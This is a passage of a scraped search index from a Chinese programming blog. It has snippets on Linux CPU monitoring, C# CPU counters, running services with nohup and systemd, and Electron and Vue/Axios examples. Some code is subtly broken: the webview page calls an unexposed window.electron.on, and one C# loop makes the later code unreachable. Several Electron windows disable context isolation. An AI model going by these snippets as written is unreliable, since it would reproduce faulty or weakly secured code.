(\u0026#39;zs\u0026#39;); INSERT INTO Users (UserName) VALUES (\u0026#39;ls\u0026#39;); INSERT INTO Users (UserName) VALUES (\u0026#39;w5\u0026#39;); GO SELECT * FROM Users; GO BACKUP USE master; GO BACKUP DATABASE mydb TO DISK = \u0026#39;mydblog.","title":"Debian docker mssql"},{"content":"linux 查看正在 cpu占用 在Linux中，可以使用多种命令来查看哪个进程正在使用CPU资源。以下是几个常用的命令：\ntop - 实时显示系统中各个进程的资源占用情况，包括CPU使用率。\ntop htop - top的增强版，提供更直观的界面，需要单独安装。\nhtop ps - 显示当前运行的进程信息，结合aux选项可以查看CPU占用率。\nps aux --sort=-%cpu | head pidstat - 用于监视个别任务的CPU和内存使用情况，通常与时间结合使用。\npidstat 1 这些命令会以实时或者定时的方式输出CPU占用前几的进程，帮助识别和解决CPU占用高的问题。\n查看docker docker ps docker ps -a docker start cont C# 获取Cpu win PerformanceCounter 实例，用于监控总 CPU 使用率（\u0026quot;_Total\u0026quot; 表示监控所有 CPU 核心的总体使用情况）。\ndotnet add package System.Diagnostics.PerformanceCounter // 创建一个用于获取 CPU 占用率的 PerformanceCounter 对象 PerformanceCounter cpuCounter = new PerformanceCounter(\u0026#34;Processor\u0026#34;, \u0026#34;% Processor Time\u0026#34;, \u0026#34;_Total\u0026#34;); // 先执行一次 NextValue()，因为第一次调用通常会返回 0 cpuCounter.NextValue(); Thread.Sleep(1000); // 等待 1 秒以便获取准确值 while (true) { // 获取当前的 CPU 使用率 float cpuUsage = cpuCounter.NextValue(); Console.WriteLine($\u0026#34;当前 CPU 占用率: {cpuUsage}%\u0026#34;); // 每隔 1 秒获取一次数据 Thread.Sleep(1000); } Linux 环境中，System.Diagnostics.PerformanceCounter 不可用，因此需要采用其他方法来获取 CPU 占用率。一个常见的方法是读取 /proc/stat 文件并解析内容，或者通过调用 Linux 的 top 或 vmstat 命令来获取 CPU 使用率。\n以下是一个通过读取 /proc/stat 文件来计算 CPU 占用率\nusing System; using System.IO; using System.Threading; class Program { static void Main() { // 初始的 CPU 时间信息 var initialCpuTimes = GetCpuTimes(); Thread.Sleep(1000); // 等待 1 秒 while (true) { // 获取当前的 CPU 时间信息 var currentCpuTimes = GetCpuTimes(); // 计算 CPU 使用率 var totalDiff = (currentCpuTimes.total - initialCpuTimes.total); var idleDiff = (currentCpuTimes.idle - initialCpuTimes.idle); var cpuUsage = 100.0 * (1.0 - (double)idleDiff / totalDiff); Console.WriteLine($\u0026#34;当前 CPU 占用率: {cpuUsage:F2}%\u0026#34;); // 更新初始时间 initialCpuTimes = currentCpuTimes; Thread.Sleep(1000); // 每秒更新一次 } } // 解析 /proc/stat 文件并计算 CPU 时间 private static (long total, long idle) GetCpuTimes() { var cpuLine = File.ReadAllText(\u0026#34;/proc/stat\u0026#34;).Split(\u0026#39;\\n\u0026#39;)[0]; var cpuValues = cpuLine.Split(new[] { \u0026#39; \u0026#39; }, StringSplitOptions.RemoveEmptyEntries); // 获取各个时间值 long user = long.Parse(cpuValues[1]); long nice = long.Parse(cpuValues[2]); long system = long.Parse(cpuValues[3]); long idle = long.Parse(cpuValues[4]); long iowait = long.Parse(cpuValues[5]); long irq = long.Parse(cpuValues[6]); long softirq = long.Parse(cpuValues[7]); // 计算总时间和空闲时间 long total = user + nice + system + idle + iowait + irq + softirq; return (total, idle); } } 通过读取 /proc/stat 文件，提取 CPU 的各个时间字段。 GetCpuTimes() 方法解析第一行的 cpu 统计数据，其中各字段代表用户、系统、空闲、IO等待等时间。 计算 CPU 使用率： totalDiff 是前后两次采集的总 CPU 时间差。 idleDiff 是前后两次采集的空闲时间差。 cpuUsage 使用公式 1.0 - (idleDiff / totalDiff) 计算 CPU 占用率。 注意事项 该代码通过每隔 1 秒采集一次数据来计算 CPU 使用率，因此可以实时显示 CPU 占用率。 GetCpuTimes() 方法中读取 /proc/stat 文件的内容，这个文件是 Linux 系统中获取 CPU 时间的标准方法。 代码适用于支持 /proc/stat 文件的 Linux 系统。\n程序捕获 top 命令的输出\nusing System; using System.Diagnostics; using System.Text.RegularExpressions; class Program { static void Main() { // 执行 `top` 命令 ProcessStartInfo psi = new ProcessStartInfo { FileName = \u0026#34;top\u0026#34;, Arguments = \u0026#34;-bn1\u0026#34;, // 一次性打印输出 RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true }; using (Process process = Process.Start(psi)) { using (var reader = process.StandardOutput) { string output = reader.ReadToEnd(); ParseCpuUsage(output); } } } private static void ParseCpuUsage(string topOutput) { // 匹配 top 命令中的 \u0026#34;Cpu(s): xx.x% us\u0026#34; 字段 Regex regex = new Regex(@\u0026#34;Cpu\\(s\\):\\s+(\\d+\\.\\d+)%\\s+us\u0026#34;, RegexOptions.Compiled); var match = regex.Match(topOutput); if (match.Success) { string cpuUsage = match.Groups[1].Value; Console.WriteLine($\u0026#34;当前系统 CPU 使用率: {cpuUsage}%\u0026#34;); } else { Console.WriteLine(\u0026#34;无法解析 CPU 使用率。\u0026#34;); } } } 判断OS系统\nvar os = Environment.OSVersion; var isWindows = os.Platform == PlatformID.Win32NT || os.Platform == PlatformID.Win32S || os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.WinCE; if (isWindows) { Console.WriteLine(\u0026#34;当前操作系统是 Windows.\u0026#34;); } else { // 对于 .NET Framework, 没有直接的方法来区分 Linux 和 macOS // 但是通常来说，如果不是 Windows，且在非 Windows 平台上运行，则可以认为是 Linux 或 macOS Console.WriteLine(\u0026#34;当前操作系统可能是 Linux 或 macOS.\u0026#34;); } ","permalink":"https://qfsyso.github.io/posts/linux-cpu-now/","summary":"linux 查看正在 cpu占用 在Linux中，可以使用多种命令来查看哪个进程正在使用CPU资源。以下是几个常用的命令：\ntop - 实时显示系统中各个进程的资源占用情况，包括CPU使用率。\ntop htop - top的增强版，提供更直观的界面，需要单独安装。\nhtop ps - 显示当前运行的进程信息，结合aux选项可以查看CPU占用率。\nps aux --sort=-%cpu | head pidstat - 用于监视个别任务的CPU和内存使用情况，通常与时间结合使用。\npidstat 1 这些命令会以实时或者定时的方式输出CPU占用前几的进程，帮助识别和解决CPU占用高的问题。\n查看docker docker ps docker ps -a docker start cont C# 获取Cpu win PerformanceCounter 实例，用于监控总 CPU 使用率（\u0026quot;_Total\u0026quot; 表示监控所有 CPU 核心的总体使用情况）。\ndotnet add package System.Diagnostics.PerformanceCounter // 创建一个用于获取 CPU 占用率的 PerformanceCounter 对象 PerformanceCounter cpuCounter = new PerformanceCounter(\u0026#34;Processor\u0026#34;, \u0026#34;% Processor Time\u0026#34;, \u0026#34;_Total\u0026#34;); // 先执行一次 NextValue()，因为第一次调用通常会返回 0 cpuCounter.NextValue(); Thread.Sleep(1000); // 等待 1 秒以便获取准确值 while (true) { // 获取当前的 CPU 使用率 float cpuUsage = cpuCounter.","title":" Linux CPU now"},{"content":"debian go程序 后台运行 要在Debian系统上将Go程序设置为后台运行，使用nohup命令和\u0026amp;符号。\n编译Go程序，生成可执行文件。\ngo build -o myapp main.go 使用nohup将程序放到后台运行，并将输出重定向到nohup.out文件。\nnohup ./myapp \u0026amp; 如果您想要程序在系统启动时自动运行，可以创建一个systemd服务文件。\n创建一个名为myapp.service的文件：\nsudo nano /etc/systemd/system/myapp.service 在编辑器中添加以下内容：\n[Unit] Description=My Go Application After=network.target [Service] Type=simple ExecStart=/path/to/your/myapp Restart=on-failure RestartSec=5 [Install] WantedBy=multi-user.target 保存并退出编辑器。\n启用并启动服务：\nsudo systemctl enable myapp.service sudo systemctl start myapp.service Go程序就会在Debian系统上作为服务后台运行。\nc# run~ sudo nohup dotnet run /root/socketa/TcpSk \u0026gt; output20240805.log 2\u0026gt;\u0026amp;1 \u0026amp; sudo nohup dotnet run /root/netser/xx \u0026gt; output1.log 2\u0026gt;\u0026amp;1 \u0026amp; ps -ef | grep nohup kill ","permalink":"https://qfsyso.github.io/posts/go-background/","summary":"debian go程序 后台运行 要在Debian系统上将Go程序设置为后台运行，使用nohup命令和\u0026amp;符号。\n编译Go程序，生成可执行文件。\ngo build -o myapp main.go 使用nohup将程序放到后台运行，并将输出重定向到nohup.out文件。\nnohup ./myapp \u0026amp; 如果您想要程序在系统启动时自动运行，可以创建一个systemd服务文件。\n创建一个名为myapp.service的文件：\nsudo nano /etc/systemd/system/myapp.service 在编辑器中添加以下内容：\n[Unit] Description=My Go Application After=network.target [Service] Type=simple ExecStart=/path/to/your/myapp Restart=on-failure RestartSec=5 [Install] WantedBy=multi-user.target 保存并退出编辑器。\n启用并启动服务：\nsudo systemctl enable myapp.service sudo systemctl start myapp.service Go程序就会在Debian系统上作为服务后台运行。\nc# run~ sudo nohup dotnet run /root/socketa/TcpSk \u0026gt; output20240805.log 2\u0026gt;\u0026amp;1 \u0026amp; sudo nohup dotnet run /root/netser/xx \u0026gt; output1.log 2\u0026gt;\u0026amp;1 \u0026amp; ps -ef | grep nohup kill ","title":" Go Background"},{"content":"在C#中，想让一个控制台应用程序保持运行而不依赖 Cnsole.ReadKey()，可以通过多种方式实现。\n1. 使用事件循环 可以使用 EventWaitHandle 或者其他类似的同步原语来创建一个事件循环，让程序保持在等待状态。\nusing System; using System.Threading; class Program { static void Main() { // 创建一个自动重置的事件对象 EventWaitHandle waitHandle = new EventWaitHandle(false, EventResetMode.AutoReset); Console.WriteLine(\u0026#34;Press any key to exit...\u0026#34;); // 等待事件被设置，如果没有接收到信号，则保持等待状态 waitHandle.WaitOne(); Console.Clear(); } } 使用无限循环 你可以创建一个无限循环，直到你手动终止程序。\n//cpu占用高~ using System; class Program { static void Main() { while (true) { // 程序在这里保持运行状态，等待事件或其他中断。 Console.WriteLine(\u0026#34;The program is running. Press CTRL+C to exit.\u0026#34;); } } } 3. 使用定时器 创建一个定时器，定期执行某些任务，或者用于控制程序行为。\nusing System; using System.Threading; class Program { static void Main() { Console.WriteLine(\u0026#34;The program is running. Press CTRL+C to exit.\u0026#34;); // 创建一个新的计时器并设定间隔时间（毫秒） Timer timer = new Timer(TimerCallback, null, 0, 1000); // 防止主线程退出 Console.ReadKey(); // 停止定时器 timer.Dispose(); } private static void TimerCallback(Object state) { Console.WriteLine(\u0026#34;The program is still running...\u0026#34;); } } 4. 使用异步等待 如果你使用的是 .NET Core 或 .NET 5 及更高版本，可以利用 Task.Run 来创建一个持续运行的任务。\nusing System; using System.Threading.Tasks; class Program { static async Task Main(string[] args) { Console.WriteLine(\u0026#34;The program is running. Press CTRL+C to exit.\u0026#34;); await Task.Run(async () =\u0026gt; { while (true) { // 模拟一些工作 await Task.Delay(1000); Console.WriteLine(\u0026#34;Doing work...\u0026#34;); } }); // 等待按键，确保主线程不会立即退出 Console.ReadKey(); } } ","permalink":"https://qfsyso.github.io/posts/c%23-keep-alive/","summary":"在C#中，想让一个控制台应用程序保持运行而不依赖 Cnsole.ReadKey()，可以通过多种方式实现。\n1. 使用事件循环 可以使用 EventWaitHandle 或者其他类似的同步原语来创建一个事件循环，让程序保持在等待状态。\nusing System; using System.Threading; class Program { static void Main() { // 创建一个自动重置的事件对象 EventWaitHandle waitHandle = new EventWaitHandle(false, EventResetMode.AutoReset); Console.WriteLine(\u0026#34;Press any key to exit...\u0026#34;); // 等待事件被设置，如果没有接收到信号，则保持等待状态 waitHandle.WaitOne(); Console.Clear(); } } 使用无限循环 你可以创建一个无限循环，直到你手动终止程序。\n//cpu占用高~ using System; class Program { static void Main() { while (true) { // 程序在这里保持运行状态，等待事件或其他中断。 Console.WriteLine(\u0026#34;The program is running. Press CTRL+C to exit.\u0026#34;); } } } 3. 使用定时器 创建一个定时器，定期执行某些任务，或者用于控制程序行为。\nusing System; using System.","title":"C# keep alive"},{"content":"Electron fetch API发送HTTP请求 npm install electron --save-dev 创建： your-electron-app/ ├── main.js ├── renderer.js └── index.html\nmain.js - Electron\nconst { app, BrowserWindow } = require(\u0026#39;electron\u0026#39;); function createWindow () { // 创建浏览器窗口 let win = new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true } }); // 加载index.html文件 win.loadFile(\u0026#39;index.html\u0026#39;); } app.whenReady().then(createWindow); renderer.js - Electron的渲染器进程文件，使用fetch发送请求： document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, () =\u0026gt; { fetch(\u0026#39;https://jsonplaceholder.typicode.com/posts/1\u0026#39;) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { document.getElementById(\u0026#39;result\u0026#39;).textContent = JSON.stringify(data, null, 2); }) .catch(error =\u0026gt; { console.error(\u0026#39;请求失败:\u0026#39;, error); }); }); index.html - 应用的HTML文件，包含一个用于显示结果的元素：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Electron Fetch Example\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Electron Fetch Example\u0026lt;/h1\u0026gt; \u0026lt;pre id=\u0026#34;result\u0026#34;\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;script src=\u0026#34;renderer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 要运行这个Electron应用程序，请在your-electron-app目录下创建一个package.json文件，如果还没有的话： { \u0026#34;name\u0026#34;: \u0026#34;your-electron-app\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;main.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;electron .\u0026#34; }, \u0026#34;keywords\u0026#34;: [], \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;devDependencies\u0026#34;: { \u0026#34;electron\u0026#34;: \u0026#34;^your-electron-version\u0026#34; } } 确保将\u0026quot;electron\u0026quot;: \u0026ldquo;^your-electron-version\u0026quot;替换为实际的Electron版本号。 然后，在终端中运行以下命令来启动Electron应用程序：\nnpm start 解析JSON 修改renderer.js文件来实现\ndocument.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, () =\u0026gt; { fetch(\u0026#39;https://jsonplaceholder.typicode.com/posts/1\u0026#39;) .then(response =\u0026gt; { // 检查响应状态 if (!response.ok) { throw new Error(\u0026#39;网络响应错误\u0026#39;); } return response.json(); }) .then(data =\u0026gt; { // 解析数据并展示 const { title, body } = data; document.getElementById(\u0026#39;title\u0026#39;).textContent = title; document.getElementById(\u0026#39;body\u0026#39;).textContent = body; }) .catch(error =\u0026gt; { console.error(\u0026#39;请求失败:\u0026#39;, error); }); }); index.html文件中添加两个元素，用于显示title和body：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Electron JSON Parsing Example\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;文章标题：\u0026lt;/h1\u0026gt; \u0026lt;p id=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;h2\u0026gt;文章正文：\u0026lt;/h2\u0026gt; \u0026lt;pre id=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;script src=\u0026#34;renderer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 现在，当Electron应用程序运行时，它会从指定的URL请求数据，解析JSON响应，然后提取并显示title和body字段。 请确保你的Electron应用程序的main.js文件正确地加载了index.html文件，并且renderer.js文件被包含在页面中。这样，当页面加载完成时，renderer.js中的代码将执行，从服务器获取数据并更新DOM元素。\nsocket Electron 应用可以同时使用 Node.js 和 Chromium 的 API，这使得它既可以在主进程中使用 Node.js 的 net 模块来创建 TCP 连接，也可以在渲染进程中使用 WebSocket 来与服务器进行实时通信。 以下是在 Electron 的主进程中使用 net 模块创建 TCP 连接的示例：\nconst { app, BrowserWindow } = require(\u0026#39;electron\u0026#39;); const net = require(\u0026#39;net\u0026#39;); function createWindow () { const win = new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true, contextIsolation: false } }); // 并加载应用的 index.html win.loadFile(\u0026#39;index.html\u0026#39;); } app.whenReady().then(() =\u0026gt; { setTimeout(() =\u0026gt; { var client = net.connect(\u0026#39;16551\u0026#39;, \u0026#39;1xxx\u0026#39;, function(){ console.log(\u0026#39;已经与服务器连接\u0026#39;); client.write(\u0026#39;Yes\\r\\n\u0026#39;); }); client.on(\u0026#39;data\u0026#39;, function(data){ console.log(data.toString()); client.end();//one msg end }); client.on(\u0026#39;end\u0026#39;, function(){ console.log(\u0026#39;客户端连接中断\u0026#39;); }); }, 2000); // }); app.whenReady().then(createWindow); 打包 Electron 应用的打包和运行过程可以分为几个步骤，包括开发、打包、分发和安装。以下是这个过程的概述：\n1. 开发阶段 在开发阶段，你将使用 Web 技术（HTML、CSS、JavaScript）和 Node.js API 来构建你的 Electron 应用。 初始化项目：创建一个新的项目目录，初始化 package.json 文件。 安装依赖：使用 npm 安装 Electron (electron) 和其他所需的依赖。 编写代码：编写主进程 (main.js) 和渲染进程的代码（通常是 HTML、CSS 和 JavaScript 文件）。\n2. 本地运行 在开发过程中，你将经常运行你的应用以测试功能。 使用 electron . 或 npm start 命令来启动你的 Electron 应用。\n3. 打包应用 打包应用是将你的应用的所有文件和依赖项打包成一个可执行的程序或安装包。 选择打包工具：Electron 社区提供了多种打包工具，如 electron-packager、electron-builder 和 electron-forge。 配置打包工具：根据你选择的打包工具，配置打包选项，如平台（Windows、macOS、Linux）、架构（x64、ia32、armv7l）等。\n4. 使用 electron-builder 打包示例 electron-builder 是一个流行的打包工具，它提供了丰富的配置选项和跨平台支持。 安装 electron-builder：\nnpm install electron-builder --save-dev 在 package.json 中配置 build 字段：\n{ \u0026#34;build\u0026#34;: { \u0026#34;appId\u0026#34;: \u0026#34;your.app.id\u0026#34;, \u0026#34;mac\u0026#34;: { \u0026#34;category\u0026#34;: \u0026#34;your.app.category\u0026#34; }, \u0026#34;win\u0026#34;: { \u0026#34;target\u0026#34;: \u0026#34;nsis\u0026#34; }, \u0026#34;linux\u0026#34;: { \u0026#34;target\u0026#34;: \u0026#34;deb\u0026#34;, \u0026#34;category\u0026#34;: \u0026#34;your.app.category\u0026#34; } } } 运行打包命令：\nnpm run build 5. 分发和安装 打包完成后，你可以将生成的可执行文件或安装包分发给用户。 Windows：用户可以下载 .exe 安装程序并运行。 macOS：用户可以下载 .dmg 或 .pkg 安装包并安装。 Linux：用户可以下载 .deb 或 .AppImage 文件并安装。\n6. 签名应用 在某些平台上，你可能需要对应用进行代码签名以确保安全性和通过应用商店的审核。 macOS：使用 Xcode 或其他工具进行签名。 Windows：使用 Windows SDK 的 signtool 进行签名。 注意事项 在打包前，请确保在 package.json 中设置了 build.appId 和其他相关配置。 不同的打包工具可能有不同的配置选项，具体请参考相应工具的文档。 在发布应用之前，确保在目标平台上进行了充分的测试。 打包和发布 Electron 应用是一个复杂的过程，涉及到多个步骤和工具。Electron 官方文档和社区提供了大量资源来帮助开发者完成这个过程。\nor\nelectron-builder，你可能还想添加一些 npm 脚本命令来简化构建过程：\n\u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;electron .\u0026#34;, \u0026#34;build\u0026#34;: \u0026#34;electron-builder -w\u0026#34;, \u0026#34;build:mac\u0026#34;: \u0026#34;electron-builder -m\u0026#34;, \u0026#34;build:linux\u0026#34;: \u0026#34;electron-builder -l\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; } 这里，build 命令会为 Windows 构建应用程序，build:mac 会为 macOS 构建，build:linux 会为 Linux 构建。使用这些命令可以快速构建特定平台的应用程序。\nhttps://www.electronjs.org/docs/latest API DOC\nWebview main.js const { app, BrowserWindow, ipcMain } = require(\u0026#39;electron\u0026#39;); const path = require(\u0026#39;path\u0026#39;); let win; function createWindow () { win = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, \u0026#39;preload.js\u0026#39;), contextIsolation: true, webviewTag: true } }); win.loadFile(\u0026#39;index.html\u0026#39;); } app.whenReady().then(createWindow); app.on(\u0026#39;window-all-closed\u0026#39;, () =\u0026gt; { if (process.platform !== \u0026#39;darwin\u0026#39;) { app.quit(); } }); app.on(\u0026#39;activate\u0026#39;, () =\u0026gt; { if (BrowserWindow.getAllWindows().length === 0) { createWindow(); } }); // Listen for navigation commands ipcMain.on(\u0026#39;navigate\u0026#39;, (event, url) =\u0026gt; { win.webContents.send(\u0026#39;navigate\u0026#39;, url); }); ipcMain.on(\u0026#39;back\u0026#39;, () =\u0026gt; { win.webContents.send(\u0026#39;back\u0026#39;); }); ipcMain.on(\u0026#39;reload\u0026#39;, () =\u0026gt; { win.webContents.send(\u0026#39;reload\u0026#39;); }); preload.js const { contextBridge, ipcRenderer } = require(\u0026#39;electron\u0026#39;); contextBridge.exposeInMainWorld(\u0026#39;electron\u0026#39;, { navigate: (url) =\u0026gt; ipcRenderer.send(\u0026#39;navigate\u0026#39;, url), back: () =\u0026gt; ipcRenderer.send(\u0026#39;back\u0026#39;), reload: () =\u0026gt; ipcRenderer.send(\u0026#39;reload\u0026#39;) }); index.html 更新为使用 webview 元素，并确保导航按钮始终可见： \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Simple Browser\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Simple Browser\u0026lt;/h1\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;url\u0026#34; placeholder=\u0026#34;Enter URL\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;go\u0026#34;\u0026gt;Go\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;back\u0026#34;\u0026gt;Back\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;reload\u0026#34;\u0026gt;Reload\u0026lt;/button\u0026gt; \u0026lt;webview id=\u0026#34;webview\u0026#34; style=\u0026#34;width:100%; height:90%;\u0026#34; src=\u0026#34;https://www.example.com\u0026#34;\u0026gt;\u0026lt;/webview\u0026gt; \u0026lt;script\u0026gt; const goButton = document.getElementById(\u0026#39;go\u0026#39;); const backButton = document.getElementById(\u0026#39;back\u0026#39;); const reloadButton = document.getElementById(\u0026#39;reload\u0026#39;); const urlInput = document.getElementById(\u0026#39;url\u0026#39;); const webview = document.getElementById(\u0026#39;webview\u0026#39;); goButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { const url = urlInput.value; if (url) { webview.src = url; } }); backButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { webview.goBack(); }); reloadButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { webview.reload(); }); // Handle navigation events from main process window.electron.on(\u0026#39;navigate\u0026#39;, (event, url) =\u0026gt; { webview.src = url; }); window.electron.on(\u0026#39;back\u0026#39;, () =\u0026gt; { webview.goBack(); }); window.electron.on(\u0026#39;reload\u0026#39;, () =\u0026gt; { webview.reload(); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这个更新后的代码使用 webview 元素来加载和显示网页，并确保导航按钮始终可见。用户可以输入 URL 并点击“Go”按钮进行导航；点击“Back”按钮返回上一个页面；点击“Reload”按钮重新加载当前页面。\nmp3 开发一个简易音乐播放器涉及到 HTML、CSS 和 JavaScript 的使用，以及 Electron API 的集成。以下是创建这样一个应用的基本步骤和代码示例：\n1. 初始化 Electron 项目 如果你还没有创建 Electron 项目，可以通过以下命令来初始化：\nmkdir electron-music-player cd electron-music-player npm init -y npm install electron --save-dev 2. 创建主进程文件 main.js const { app, BrowserWindow } = require(\u0026#39;electron\u0026#39;); function createWindow() { // 创建窗口 let win = new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true, contextIsolation: false } }); // 加载index.html文件 win.loadFile(\u0026#39;index.html\u0026#39;); } app.whenReady().then(createWindow); 创建 HTML 文件 index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;简易音乐播放器\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;简易音乐播放器\u0026lt;/h1\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;musicFile\u0026#34; multiple /\u0026gt; \u0026lt;audio id=\u0026#34;audioPlayer\u0026#34; controls\u0026gt;\u0026lt;/audio\u0026gt; \u0026lt;div\u0026gt; \u0026lt;button id=\u0026#34;play\u0026#34;\u0026gt;播放\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;pause\u0026#34;\u0026gt;暂停\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;prev\u0026#34;\u0026gt;上一首\u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;next\u0026#34;\u0026gt;下一首\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;renderer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 4. 创建渲染进程脚本 renderer.js document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, () =\u0026gt; { const playButton = document.getElementById(\u0026#39;play\u0026#39;); const pauseButton = document.getElementById(\u0026#39;pause\u0026#39;); const prevButton = document.getElementById(\u0026#39;prev\u0026#39;); const nextButton = document.getElementById(\u0026#39;next\u0026#39;); const musicFileInput = document.getElementById(\u0026#39;musicFile\u0026#39;); const audioPlayer = document.getElementById(\u0026#39;audioPlayer\u0026#39;); let songIndex = 0; const songs = []; // 监听文件选择 musicFileInput.addEventListener(\u0026#39;change\u0026#39;, (e) =\u0026gt; { songs.push(...Array.from(e.target.files).map(file =\u0026gt; URL.createObjectURL(file))); }); // 播放音乐 playButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { if (songs[songIndex]) { audioPlayer.src = songs[songIndex]; audioPlayer.play(); } }); // 暂停音乐 pauseButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { audioPlayer.pause(); }); // 上一首 prevButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { if (songIndex \u0026gt; 0) { songIndex--; playButton.click(); } }); // 下一首 nextButton.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { if (songIndex \u0026lt; songs.length - 1) { songIndex++; playButton.click(); } else { // 可以添加歌曲列表循环播放的逻辑 } }); }); 5. 添加启动脚本 在 package.json 中添加 \u0026ldquo;start\u0026rdquo; 脚本来运行 Electron 应用：\n\u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;electron .\u0026#34; } 6. 运行应用 npm start 这个简易音乐播放器允许用户选择音乐文件，然后通过按钮控制播放、暂停以及上一首和下一首的切换。\n","permalink":"https://qfsyso.github.io/posts/electron-app/","summary":"Electron fetch API发送HTTP请求 npm install electron --save-dev 创建： your-electron-app/ ├── main.js ├── renderer.js └── index.html\nmain.js - Electron\nconst { app, BrowserWindow } = require(\u0026#39;electron\u0026#39;); function createWindow () { // 创建浏览器窗口 let win = new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true } }); // 加载index.html文件 win.loadFile(\u0026#39;index.html\u0026#39;); } app.whenReady().then(createWindow); renderer.js - Electron的渲染器进程文件，使用fetch发送请求： document.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, () =\u0026gt; { fetch(\u0026#39;https://jsonplaceholder.typicode.com/posts/1\u0026#39;) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { document.getElementById(\u0026#39;result\u0026#39;).textContent = JSON.stringify(data, null, 2); }) .","title":"Electron App"},{"content":"具体步骤 安装 Axios: 使用 Axios 进行 HTTP 请求。\n封装 Axios: 将 Axios 封装成一个模块以便在项目中复用。\n解决跨域问题: 在 vite.config.ts 文件中配置代理以解决跨域问题。\n调用 API: 在 Vue 组件中使用封装的 Axios 进行数据请求和显示。\n安装 Axios 首先，确保你已经安装了 Axios：\nbash Copy Code npm install axios\n封装 Axios 创建一个 http 文件夹并在其中创建一个 request.ts 文件：\nsrc/http/request.ts:\nimport axios from \u0026#39;axios\u0026#39;; const service = axios.create({ baseURL: \u0026#39;http://localhost:16552/api/zblack\u0026#39;, // 根据你的后端API地址调整 timeout: 5000, // 请求超时时间 }); // 请求拦截器 service.interceptors.request.use( config =\u0026gt; { return config; }, error =\u0026gt; { console.error(\u0026#39;请求错误:\u0026#39;, error); return Promise.reject(error); } ); // 响应拦截器 service.interceptors.response.use( response =\u0026gt; { const res = response.data; if (res.isOk) { return res.rsData; } else { console.error(\u0026#39;请求错误:\u0026#39;, res.msg); return Promise.reject(new Error(res.msg || \u0026#39;Error\u0026#39;)); } }, error =\u0026gt; { console.error(\u0026#39;响应错误:\u0026#39;, error); return Promise.reject(error); } ); export default service; 3. 解决跨域问题 在 vite.config.ts 文件中添加代理配置：\nvite.config.ts:\nimport { defineConfig } from \u0026#39;vite\u0026#39;; import vue from \u0026#39;@vitejs/plugin-vue\u0026#39;; export default defineConfig({ plugins: [vue()], server: { proxy: { \u0026#39;/api\u0026#39;: { target: \u0026#39;http://localhost:16552\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; 